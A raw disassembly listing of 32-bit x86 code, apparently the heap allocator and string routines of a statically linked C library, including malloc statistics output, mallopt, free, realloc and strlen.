ret
mov dword [esp], ebx
call fcn.08052430
jmp 0x8052d42
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 0x28], 1
je 0x8052daa
mov ecx, dword [0x80aa7f8]
mov eax, dword [arg_ch]
mov dword [esp], ebx
mov edx, ecx
lea eax, [ecx + eax - 1]
mov dword [var_sp_4h], ecx
neg edx
and eax, edx
mov dword [var_8h], eax
call fcn.080528e0
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.08052430
jmp 0x8052d82
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 8
mov dword [esp], 0x80aa360
call fcn.08052430
mov eax, dword [arg_8h]
mov dword [var_4h], 0x80aa360
mov dword [esp], eax
call fcn.08050e70
leave
ret
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
test eax, eax
je 0x8052e1b
lea edx, [eax - 8]
mov eax, dword [edx + 4]
test al, 2
je 0x8052e0c
and eax, 0xfffffff8
sub eax, 8
leave
ret
and eax, 0xfffffff8
test byte [eax + edx + 4], 1
je 0x8052e1b
sub eax, 4
jmp 0x8052e0a
xor eax, eax
jmp 0x8052e0a
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
mov eax, dword [arg_ch]
mov eax, dword [eax + 0x54]
test eax, eax
mov dword [var_50h], eax
je 0x8052f3a
mov eax, dword [var_50h]
mov esi, 1
mov dword [var_44h], 0
mov dword [var_40h], 0
xor ebx, ebx
mov edi, dword [eax + 4]
and edi, 0xfffffff8
mov eax, dword [arg_ch]
mov edx, dword [eax + ebx*4 + 0x2c]
test edx, edx
je 0x8052e76
mov eax, dword [edx + 4]
inc dword [var_44h]
mov edx, dword [edx + 8]
and eax, 0xfffffff8
add dword [var_40h], eax
test edx, edx
jne 0x8052e63
inc ebx
cmp ebx, 9
jbe 0x8052e58
mov ecx, dword [arg_ch]
add edi, dword [var_40h]
mov ebx, 1
add ecx, 0x5c
lea esi, [esi]
mov edx, dword [ecx + 0xc]
cmp edx, ecx
je 0x8052ea7
mov eax, dword [edx + 4]
inc esi
mov edx, dword [edx + 0xc]
and eax, 0xfffffff8
add edi, eax
cmp edx, ecx
jne 0x8052e97
inc ebx
add ecx, 8
cmp ebx, 0x7f
jbe 0x8052e90
mov edx, dword [var_44h]
mov ebx, dword [arg_ch]
mov dword [var_38h], esi
mov dword [var_1ch], edi
mov ecx, dword [0x80aa7fc]
mov dword [var_34h], edx
mov eax, dword [ebx + 0x470]
mov ebx, dword [0x80aa7ec]
mov dword [var_2ch], ecx
mov edx, eax
mov dword [var_30h], ebx
mov dword [var_54h], ebx
sub edx, edi
mov ebx, dword [var_50h]
mov dword [var_3ch], eax
mov dword [var_20h], edx
mov dword [var_48h], edx
mov edx, dword [var_40h]
mov dword [var_24h], edx
mov edx, dword [ebx + 4]
mov ebx, dword [0x80aa804]
and edx, 0xfffffff8
mov dword [var_4ch], edx
mov edx, dword [arg_8h]
mov dword [edx], eax
mov dword [edx + 0x14], ebx
mov dword [edx + 4], esi
mov eax, dword [var_44h]
mov ebx, dword [var_40h]
mov dword [edx + 0x10], ecx
mov dword [edx + 8], eax
mov dword [edx + 0x18], ebx
mov eax, dword [var_54h]
mov dword [edx + 0xc], eax
mov eax, dword [var_48h]
mov dword [edx + 0x1c], eax
mov eax, edx
mov dword [edx + 0x20], edi
mov ebx, dword [var_4ch]
mov dword [edx + 0x24], ebx
add esp, 0x4c
pop ebx
pop esi
pop edi
leave
ret 4
mov edx, dword [arg_ch]
mov dword [esp], edx
call fcn.08052430
mov ebx, dword [arg_ch]
mov ebx, dword [ebx + 0x54]
mov dword [var_50h], ebx
jmp 0x8052e3a
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x48
mov eax, dword [0x80a9518]
mov edi, dword [0x80aa7fc]
test eax, eax
mov esi, edi
js 0x805310b
mov edx, dword [0x80a9504]
mov dword [var_40h], 0
mov ebx, 0x80aa360
mov eax, dword [edx + 0x3c]
mov dword [var_44h], eax
or eax, 2
mov dword [edx + 0x3c], eax
lea esi, [esi]
mov edx, 0
test edx, edx
je 0x8053100
mov dword [esp], ebx
call section.
lea eax, [var_3ch]
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08052e20
mov edx, dword [var_40h]
mov eax, dword [0x80a9504]
sub esp, 4
mov dword [var_4h_2], str.Arena__d:_n
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.08049b80
mov eax, dword [var_3ch]
mov dword [var_4h_2], str.system_bytes_______10u_n
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov dword [var_4h_2], str.in_use_bytes_______10u_n
mov eax, dword [var_20h]
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov eax, 0
add esi, dword [var_3ch]
add edi, dword [var_20h]
test eax, eax
je 0x80530f2
mov dword [esp], ebx
call section.
mov ebx, dword [ebx + 0x46c]
cmp ebx, 0x80aa360
je 0x805304c
inc dword [var_40h]
jmp 0x8052fa0
mov eax, dword [0x80a9504]
mov dword [var_4h], 0x14
mov dword [var_4h_2], 1
mov dword [esp], str.Total__incl._mmap_:_n
mov dword [var_ch], eax
call fcn.08075380
mov eax, dword [0x80a9504]
mov dword [var_4h], esi
mov dword [var_4h_2], str.system_bytes_______10u_n
mov dword [esp], eax
call fcn.08049b80
mov eax, dword [0x80a9504]
mov dword [var_4h], edi
mov dword [var_4h_2], str.in_use_bytes_______10u_n
mov dword [esp], eax
call fcn.08049b80
mov dword [var_4h_2], str.max_mmap_regions___10u_n
mov eax, dword [0x80aa7f4]
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov dword [var_4h_2], str.max_mmap_bytes_____10lu_n
mov eax, dword [0x80aa800]
mov dword [var_4h], eax
mov eax, dword [0x80a9504]
mov dword [esp], eax
call fcn.08049b80
mov edx, dword [var_44h]
mov eax, dword [0x80a9504]
or dword [eax + 0x3c], edx
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov dword [ebx], 0
jmp 0x8053036
lea esi, [esi]
mov dword [ebx], 1
jmp 0x8052fb5
call fcn.0804f290
jmp 0x8052f7e
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [0x80a9518]
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, 1
test eax, eax
js 0x805321d
mov eax, 0
test eax, eax
je 0x805320e
mov dword [esp], 0x80aa360
call section.
mov dword [esp], 0x80aa360
call fcn.08052430
mov eax, dword [arg_8h]
add eax, 5
cmp eax, 6
ja case.0x8053171.0
jmp dword [eax*4 + 0x8092da8]
cmp ebx, 0x50
ja 0x80531da
mov eax, dword [0x80aa388]
and eax, 2
test ebx, ebx
je 0x80531d3
lea edx, [ebx + 0xb]
cmp edx, 0xf
jbe 0x80531cc
and edx, 0xfffffff8
or edx, eax
or edx, 1
mov eax, 0x80aa360
mov dword [eax + 0x28], edx
mov eax, 0
test eax, eax
je 0x80531c0
mov dword [esp], 0x80aa360
call section.
mov eax, esi
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov dword [0x80aa360], 0
jmp 0x80531b6
mov edx, eax
or edx, 0x11
jmp 0x8053199
mov edx, eax
or edx, 9
jmp 0x8053199
xor esi, esi
jmp case.0x8053171.0
mov dword [0x80a951c], ebx
jmp case.0x8053171.0
mov dword [0x80aa7f0], ebx
jmp case.0x8053171.0
cmp ebx, 0x80000
ja 0x80531da
mov dword [0x80aa7e8], ebx
jmp case.0x8053171.0
mov dword [0x80aa7e4], ebx
jmp case.0x8053171.0
mov dword [0x80aa7e0], ebx
jmp case.0x8053171.0
mov dword [0x80aa360], 1
jmp 0x805315a
call fcn.0804f290
jmp 0x8053141
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x14
mov ecx, dword [arg_ch]
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [0x80a9514]
mov esi, dword [arg_10h]
test cl, 3
jne 0x8053260
mov edx, ecx
shr edx, 2
lea eax, [edx - 1]
test edx, eax
jne 0x8053260
test ecx, ecx
jne 0x805326d
lea esi, [esi]
mov eax, 0x16
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
test ebx, ebx
je 0x8053295
mov eax, dword [arg_4h]
mov dword [var_sp_4h], esi
mov dword [esp], ecx
mov dword [var_sp_8h], eax
call ebx
mov edx, eax
mov eax, 0xc
test edx, edx
je 0x8053265
mov eax, dword [arg_8h]
mov dword [eax], edx
xor eax, eax
jmp 0x8053265
mov dword [var_sp_4h], esi
mov dword [esp], ecx
call fcn.080513d0
jmp 0x8053281
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 4
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08054640
mov edx, eax
xor eax, eax
cmp edx, 0xffffffff
cmovne eax, edx
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov edi, dword [arg_8h]
test edi, edi
js 0x8053327
cmp edi, dword [0x80a2698]
jge 0x8053327
mov eax, dword [edi*4 + 0x80a24a0]
test eax, eax
jne 0x80533dd
mov dword [var_8h], 5
mov dword [var_4h], 0x8092dc4
mov dword [esp], str.libc
call fcn.0805f1f0
mov dword [esp], eax
mov ebx, eax
call fcn.08053400
mov dword [esp], edi
mov dword [var_8h], 0xa
mov esi, eax
mov byte [var_18h], 0
mov dword [var_ch], 0
lea eax, [var_2ch]
mov dword [var_30h], eax
lea eax, [var_18h]
mov dword [var_4h], eax
call fcn.08063c00
mov edx, dword [arg_ch]
cmp dword [arg_10h], esi
mov edi, eax
mov dword [var_4h], ebx
mov eax, dword [arg_10h]
mov dword [esp], edx
cmova eax, esi
mov dword [var_8h], eax
call fcn.08053740
cmp esi, dword [arg_10h]
mov ecx, eax
jae 0x80533c0
sub dword [var_30h], edi
mov edx, dword [arg_10h]
mov dword [var_4h], edi
mov eax, dword [var_30h]
mov dword [esp], ecx
sub edx, esi
add eax, 0x15
cmp eax, edx
cmovae eax, edx
mov dword [var_8h], eax
call fcn.08053770
mov eax, dword [arg_10h]
test eax, eax
je 0x80533d2
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov byte [edx + eax - 1], 0
mov eax, dword [arg_ch]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_8h], 5
mov dword [var_4h], eax
mov dword [esp], str.libc
call fcn.0805f1f0
jmp 0x80533d5
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov ecx, dword [arg_4h]
mov eax, ecx
and ecx, 3
je 0x8053433
cmp byte [eax], ch
je 0x80534aa
inc eax
xor ecx, 3
je 0x8053433
cmp byte [eax], ch
je 0x80534aa
add eax, 1
sub ecx, 1
je 0x8053433
cmp byte [eax], ch
je 0x80534aa
sub eax, 0xf
add eax, 0x10
mov ecx, dword [eax]
mov edx, 0xfefefeff
add edx, ecx
jae 0x8053497
xor edx, ecx
or edx, 0xfefefeff
inc edx
jne 0x8053497
mov ecx, dword [eax + 4]
mov edx, 0xfefefeff
add edx, ecx
jae 0x8053494
xor edx, ecx
or edx, 0xfefefeff
inc edx
jne 0x8053494
mov ecx, dword [eax + 8]
mov edx, 0xfefefeff
add edx, ecx
jae 0x8053491
xor edx, ecx
or edx, 0xfefefeff
inc edx
jne 0x8053491
mov ecx, dword [eax + 0xc]
mov edx, 0xfefefeff
add edx, ecx
jae 0x805348e
xor edx, ecx
or edx, 0xfefefeff
inc edx
je 0x8053430
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x80534aa
inc eax
test ch, ch
je 0x80534aa
inc eax
test ecx, 0xff0000
je 0x80534aa
inc eax
sub eax, dword [arg_4h]
ret
nop
push ebp
mov ebp, esp
push edi
mov edx, dword [arg_8h]
push esi
mov ecx, dword [arg_ch]
push ebx
mov ebx, dword [arg_10h]
mov edi, edx
movzx eax, byte [edx]
inc edx
test al, al
jne 0x80534c1
sub edx, 2
cmp ebx, 3
jbe 0x8053508
mov esi, ebx
shr esi, 2
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
dec esi
jne 0x80534d6
and ebx, 3
test ebx, ebx
je 0x805351e
lea esi, [esi]
movzx eax, byte [ecx]
inc edx
inc ecx
test al, al
mov byte [edx], al
je 0x8053526
dec ebx
jne 0x8053510
test al, al
je 0x8053526
mov byte [edx + 1], 0
pop ebx
pop esi
mov eax, edi
pop edi
leave
ret
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
mov edi, dword [arg_8h]
mov ecx, dword [arg_ch]
push ebx
mov ebx, dword [arg_10h]
lea edx, [edi - 1]
cmp ebx, 3
jbe 0x805357f
mov esi, ebx
invalid
push ebp
mov ebp, esp
sub esp, 0x24
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov dword [var_8h], esi
mov ebx, dword [arg_ch]
call fcn.080546b0
mov edi, dword [arg_8h]
dec eax
test ebx, ebx
js 0x804f76a
add ebx, eax
mov edx, 0xffffffff
not eax
and ebx, eax
mov eax, dword [edi + 8]
lea esi, [ebx + eax]
cmp esi, 0x100000
jg 0x804f75d
lea eax, [eax + edi]
mov dword [var_sp_8h], 3
mov dword [var_sp_4h], ebx
mov dword [esp], eax
call fcn.080547a0
mov edx, 0xfffffffe
test eax, eax
jne 0x804f75d
mov dword [edi + 8], esi
xor edx, edx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
mov esi, dword [edi + 8]
mov edx, 0xffffffff
add esi, ebx
cmp esi, 0xf
jle 0x804f75d
neg ebx
lea eax, [esi + edi]
mov dword [var_14h], 0
mov dword [var_10h], 0xffffffff
mov dword [var_sp_ch], 0x32
mov dword [var_sp_8h], 0
mov dword [var_sp_4h], ebx
mov dword [esp], eax
call fcn.080546d0
inc eax
mov edx, 0xfffffffe
jne 0x804f758
jmp 0x804f75d
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [0x80aa844]
test eax, eax
jne 0x8048b36
mov eax, 0x80aa858
leave
ret
call section.
mov eax, dword [eax + 0x1b8]
jmp 0x8048b34
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
mov ebx, edx
sub esp, 0x18
call fcn.080546b0
lea edx, [eax - 1]
lea eax, [ebx + edi]
cmp eax, 0x7fff
ja 0x804f6dc
mov edi, 0x8000
add edi, edx
mov dword [var_14h], 0
mov dword [var_10h], 0xffffffff
not edx
mov dword [var_ch], 0x4022
mov dword [var_8h], 0
and edi, edx
mov dword [var_4h], 0x200000
mov dword [esp], 0
call fcn.080546d0
cmp eax, 0xffffffff
je 0x804f695
lea esi, [eax + 0xfffff]
mov dword [esp], eax
and esi, 0xfff00000
mov ebx, esi
sub ebx, eax
mov dword [var_4h], ebx
call fcn.08054780
mov eax, 0x100000
sub eax, ebx
mov dword [var_4h], eax
lea eax, [esi + 0x100000]
mov dword [esp], eax
call fcn.08054780
mov dword [var_8h], 3
mov dword [var_4h], edi
mov dword [esp], esi
call fcn.080547a0
test eax, eax
jne 0x804f681
mov dword [esi + 8], edi
mov eax, esi
add esp, 0x18
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_4h], 0x100000
mov dword [esp], esi
call fcn.08054780
xor eax, eax
jmp 0x804f679
mov dword [var_14h], 0
mov dword [var_10h], 0xffffffff
mov dword [var_ch], 0x4022
mov dword [var_8h], 0
mov dword [var_4h], 0x100000
mov dword [esp], 0
call fcn.080546d0
mov esi, eax
xor eax, eax
cmp esi, 0xffffffff
je 0x804f679
test esi, 0xfffff
je 0x804f65c
jmp 0x804f681
cmp eax, 0x100000
ja 0x804f6ea
mov edi, eax
jmp 0x804f5e8
xor eax, eax
cmp edi, 0x100000
ja 0x804f679
mov edi, 0x100000
jmp 0x804f5e8
push ebp
mov ebp, esp
sub esp, 0x24
mov dword [var_8h], esi
mov eax, dword [arg_8h]
mov dword [var_ch], ebx
mov esi, dword [arg_ch]
mov dword [var_4h], edi
mov dword [var_10h], eax
test esi, esi
je 0x8052272
lea ecx, [esi - 8]
mov edx, dword [ecx + 4]
mov ebx, edx
and ebx, 0xfffffff8
mov eax, ebx
neg eax
cmp ecx, eax
ja 0x80523dd
mov edi, dword [var_10h_2]
mov eax, dword [edi + 0x28]
cmp ebx, eax
ja 0x8052280
shr ebx, 3
and eax, 0xfffffffe
lea edx, [edi + ebx*4]
mov dword [edi + 0x28], eax
mov eax, dword [edx + 0x24]
mov dword [ecx + 8], eax
mov dword [edx + 0x24], ecx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea esi, [esi]
test dl, 2
jne 0x80523b4
lea edi, [ebx + ecx]
mov eax, dword [edi + 4]
mov dword [var_18h], eax
and eax, 0xfffffff8
and edx, 1
mov dword [var_14h], eax
jne 0x80522c7
mov eax, dword [esi - 8]
sub ecx, eax
add ebx, eax
mov edx, dword [ecx + 8]
mov eax, dword [ecx + 0xc]
cmp dword [edx + 0xc], ecx
jne 0x80522b4
cmp dword [eax + 8], ecx
je 0x80522c1
hlt
mov dword [esp], 0x7f
call fcn.08053d90
mov dword [edx + 0xc], eax
mov dword [eax + 8], edx
mov edx, dword [var_10h_2]
cmp edi, dword [edx + 0x54]
je 0x80523a6
mov eax, dword [var_10h_2]
test byte [eax + edi + 4], 1
jne 0x8052397
mov edx, dword [edi + 8]
mov eax, dword [edi + 0xc]
cmp dword [edx + 0xc], edi
jne 0x80522b4
cmp dword [eax + 8], edi
jne 0x80522b4
add ebx, dword [var_10h_2]
mov dword [edx + 0xc], eax
mov dword [eax + 8], edx
mov eax, dword [var_ch_2]
mov dword [ebx + ecx], ebx
add eax, 0x5c
mov edx, dword [eax + 8]
mov dword [ecx + 0xc], eax
mov dword [ecx + 8], edx
mov dword [edx + 0xc], ecx
mov dword [eax + 8], ecx
mov eax, ebx
or eax, 1
mov dword [ecx + 4], eax
cmp ebx, 0xffff
jbe 0x8052272
mov eax, dword [var_10h_2]
test byte [eax + 0x28], 1
je 0x805238d
cmp dword [var_10h_2], 0x80aa360
je 0x8052358
mov edx, dword [var_ch_2]
mov ebx, dword [var_8h_2]
mov esi, dword [var_4h_2]
mov edi, dword [var_4h_3]
mov eax, dword [edx + 0x54]
mov edx, dword [0x80aa7e4]
leave
and eax, 0xfff00000
jmp 0x804f7c0
mov eax, dword [0x80aa3b4]
mov eax, dword [eax + 4]
and eax, 0xfffffff8
cmp eax, dword [0x80aa7e0]
jb 0x8052272
mov dword [var_sp_8h], 0x80aa360
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_2]
mov eax, dword [0x80aa7e4]
mov edi, dword [var_4h_2]
mov dword [var_sp_4h], eax
leave
jmp fcn.08050e70
mov dword [esp], eax
call fcn.08052430
jmp 0x805232f
and dword [var_14h], 0xfffffffe
mov edx, dword [var_14h]
mov dword [edi + 4], edx
jmp 0x80522fa
add ebx, dword [var_14h]
mov edi, dword [var_10h_2]
mov dword [edi + 0x54], ecx
jmp 0x8052312
mov edx, dword [esi - 8]
dec dword [0x80aa7ec]
lea eax, [edx + ebx]
sub ecx, edx
sub dword [0x80aa7fc], eax
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_2]
mov dword [var_sp_8h], eax
mov dword [var_sp_4h], ecx
mov edi, dword [var_4h_2]
leave
jmp fcn.08054780
mov eax, dword [0x80a951c]
test al, 1
jne 0x80523f0
test al, 2
je 0x8052272
jmp 0x8052424
mov edx, dword [0x80a9504]
mov ebx, dword [edx + 0x3c]
mov eax, ebx
or eax, 2
mov dword [edx + 0x3c], eax
mov dword [esp], edx
mov dword [var_sp_4h], str.free__:_invalid_pointer__p__n
mov dword [var_sp_8h], esi
call fcn.08049b80
mov eax, dword [0x80a9504]
or dword [eax + 0x3c], ebx
mov eax, dword [0x80a951c]
jmp 0x80523e6
call fcn.08062c50
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov eax, dword [var_sp_4h]
mov dword [var_10h_2], eax
mov edx, eax
mov eax, dword [eax + 0x28]
test eax, eax
je 0x8052551
mov ebx, dword [var_10h_2]
or eax, 1
mov dword [edx + 0x28], eax
shr eax, 3
add edx, 0x5c
mov dword [var_20h], edx
lea eax, [ebx + eax*4 + 0x24]
add ebx, 0x2c
mov dword [var_18h], eax
mov dword [var_14h], ebx
nop
lea esi, [esi]
mov eax, dword [var_14h]
mov ecx, dword [eax]
test ecx, ecx
je 0x805251c
mov dword [eax], 0
mov eax, dword [ecx + 4]
mov edx, dword [ecx + 8]
mov esi, eax
mov dword [var_1ch], edx
and esi, 0xfffffffa
lea edx, [esi + ecx]
mov edi, dword [edx + 4]
mov ebx, edi
and ebx, 0xfffffff8
test al, 1
mov dword [var_24h], ebx
jne 0x80524c7
mov eax, dword [ecx]
sub ecx, eax
add esi, eax
mov ebx, dword [ecx + 8]
mov eax, dword [ecx + 0xc]
cmp dword [ebx + 0xc], ecx
jne 0x8052563
cmp dword [eax + 8], ecx
jne 0x8052563
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
mov eax, dword [var_10h_2]
cmp edx, dword [eax + 0x54]
je 0x8052540
mov ebx, dword [var_24h]
test byte [ebx + edx + 4], 1
jne 0x8052534
add esi, ebx
mov eax, dword [edx + 0xc]
mov ebx, dword [edx + 8]
cmp dword [ebx + 0xc], edx
jne 0x8052563
cmp dword [eax + 8], edx
jne 0x8052563
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
mov eax, dword [var_20h]
mov ebx, dword [var_20h]
mov dword [esi + ecx], esi
mov edx, dword [eax + 8]
mov dword [eax + 8], ecx
mov eax, esi
or eax, 1
mov dword [ecx + 4], eax
mov dword [edx + 0xc], ecx
mov dword [ecx + 8], edx
mov dword [ecx + 0xc], ebx
mov ecx, dword [var_1ch]
test ecx, ecx
jne 0x8052483
mov eax, dword [var_14h]
add dword [var_14h], 4
cmp eax, dword [var_18h]
jne 0x8052470
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
and edi, 0xfffffffe
mov dword [edx + 4], edi
jmp 0x80524f1
lea esi, [esi]
add esi, dword [var_24h]
mov eax, dword [var_10h_2]
mov dword [eax + 0x54], ecx
or esi, 1
mov dword [ecx + 4], esi
jmp 0x8052511
mov edx, dword [var_10h_2]
mov dword [var_sp_4h], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
jmp fcn.0804edc0
hlt
mov dword [esp], 0x7f
call fcn.08053d90
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov ebx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
test eax, eax
je 0x80528cc
test ebx, ebx
je 0x80528b7
cmp eax, 0xffffffdf
ja 0x80528a5
add eax, 0xb
mov dword [var_14h], 0x10
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
lea eax, [ebx - 8]
cmovb edx, dword [var_14h]
mov ecx, dword [eax + 4]
mov dword [var_18h], eax
mov dword [var_14h], edx
mov edx, ecx
and edx, 0xfffffff8
test cl, 2
mov dword [var_1ch], edx
jne 0x80527c5
mov eax, dword [var_14h]
mov edi, edx
cmp edx, eax
jae 0x8052630
mov esi, dword [var_18h]
add esi, edx
mov edx, dword [var_10h]
cmp esi, dword [edx + 0x54]
je 0x8052777
mov eax, dword [esi + 4]
and eax, 0xfffffff8
test byte [eax + esi + 4], 1
jne 0x80526c0
mov edi, dword [var_1ch]
add edi, eax
cmp edi, dword [var_14h]
jb 0x80526c0
mov edx, dword [esi + 8]
mov eax, dword [esi + 0xc]
cmp dword [edx + 0xc], esi
jne 0x805261a
cmp dword [eax + 8], esi
je 0x8052627
hlt
mov dword [esp], 0x7f
call fcn.08053d90
mov dword [edx + 0xc], eax
mov dword [eax + 8], edx
lea esi, [esi]
mov ebx, edi
sub ebx, dword [var_14h]
cmp ebx, 0xf
ja 0x8052669
mov eax, ecx
and eax, 7
or eax, edi
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [edx + 4], eax
or dword [edi + edx + 4], 1
mov eax, dword [var_18h]
add eax, 8
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret
mov eax, ecx
mov edx, dword [var_18h]
add edx, dword [var_14h]
and eax, 7
or eax, dword [var_14h]
mov ecx, eax
or ecx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, ecx
mov ecx, dword [var_18h]
mov dword [ecx + 4], eax
mov ecx, ebx
mov eax, ebx
or eax, 1
or ecx, 5
cmp dword [var_10h], 0x80aa360
cmovne eax, ecx
mov dword [edx + 4], eax
or dword [ebx + edx + 4], 1
add edx, 8
mov dword [var_4h], edx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
jmp 0x805265b
lea esi, [esi]
mov eax, dword [var_14h]
sub eax, 7
mov dword [var_4h], eax
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08051cf0
mov dword [var_24h], eax
mov edx, dword [var_24h]
xor eax, eax
test edx, edx
je 0x8052661
mov eax, dword [var_24h]
sub eax, 8
mov edi, dword [eax + 4]
mov dword [var_20h], eax
and edi, 0xfffffff8
cmp eax, esi
je 0x8052769
mov ecx, dword [var_1ch]
sub ecx, 4
shr ecx, 2
cmp ecx, 9
jbe 0x8052721
cld
mov edi, dword [var_24h]
mov esi, ebx
rep movsd dword es:[edi], dword ptr [esi]
mov dword [var_4h], ebx
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08052220
mov eax, dword [var_20h]
jmp 0x805265e
mov eax, dword [ebx]
mov edx, dword [var_24h]
cmp ecx, 4
mov dword [edx], eax
mov eax, dword [ebx + 4]
mov dword [edx + 4], eax
mov eax, dword [ebx + 8]
mov dword [edx + 8], eax
jbe 0x805270a
mov eax, dword [ebx + 0xc]
cmp ecx, 6
mov dword [edx + 0xc], eax
mov eax, dword [ebx + 0x10]
mov dword [edx + 0x10], eax
jbe 0x805270a
mov eax, dword [ebx + 0x14]
cmp ecx, 8
mov dword [edx + 0x14], eax
mov eax, dword [ebx + 0x18]
mov dword [edx + 0x18], eax
jbe 0x805270a
mov eax, dword [ebx + 0x1c]
mov dword [edx + 0x1c], eax
mov eax, dword [ebx + 0x20]
mov dword [edx + 0x20], eax
jmp 0x805270a
mov edx, dword [var_18h]
add edi, dword [var_1ch]
mov ecx, dword [edx + 4]
jmp 0x8052630
mov eax, dword [esi + 4]
and eax, 0xfffffff8
add edi, eax
mov eax, dword [var_14h]
add eax, 0x10
cmp edi, eax
jb 0x80526c0
mov eax, ecx
mov ecx, dword [var_18h]
and eax, 7
or eax, dword [var_14h]
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
sub edi, dword [var_14h]
mov edx, dword [var_10h]
mov dword [ecx + 4], eax
mov eax, ecx
add eax, dword [var_14h]
or edi, 1
mov dword [edx + 0x54], eax
mov dword [eax + 4], edi
mov eax, ebx
jmp 0x8052661
mov esi, dword [ebx - 8]
mov eax, dword [0x80aa7f8]
mov edx, dword [var_14h]
dec eax
add edx, esi
lea edi, [eax + edx + 4]
not eax
and edi, eax
mov eax, ebx
mov edx, edi
sub edx, esi
cmp dword [var_1ch], edx
mov dword [var_28h], edx
je 0x8052661
mov dword [var_ch], 1
mov dword [var_8h], edi
mov eax, dword [var_1ch]
add eax, esi
mov dword [var_4h], eax
sub dword [var_18h], esi
mov ecx, dword [var_18h]
mov dword [esp], ecx
call fcn.080548a0
cmp eax, 0xffffffff
je 0x8052849
or dword [var_28h], 2
add eax, esi
mov edx, dword [var_28h]
mov dword [var_20h], eax
mov dword [eax + 4], edx
mov eax, dword [0x80aa800]
mov edx, edi
sub edx, dword [var_1ch]
add edx, dword [0x80aa7fc]
cmp edx, eax
mov dword [0x80aa7fc], edx
cmova eax, edx
mov dword [0x80aa800], eax
jmp 0x8052719
mov eax, dword [var_14h]
mov dword [var_24h], ebx
add eax, 4
cmp dword [var_1ch], eax
jb 0x805285f
mov eax, dword [var_24h]
jmp 0x8052661
mov eax, dword [var_14h]
sub eax, 7
mov dword [var_4h], eax
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08051cf0
test eax, eax
mov dword [var_24h], eax
je 0x8052857
mov eax, dword [var_1ch]
mov dword [var_4h], ebx
sub eax, 8
mov dword [var_8h], eax
mov eax, dword [var_24h]
mov dword [esp], eax
call fcn.08053770
mov dword [var_4h], ebx
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08052220
jmp 0x8052857
call fcn.08048b20
mov dword [eax], 0xc
xor eax, eax
jmp 0x8052661
mov ecx, dword [var_10h]
mov dword [arg_ch], eax
mov dword [arg_8h], ecx
add esp, 0x2c
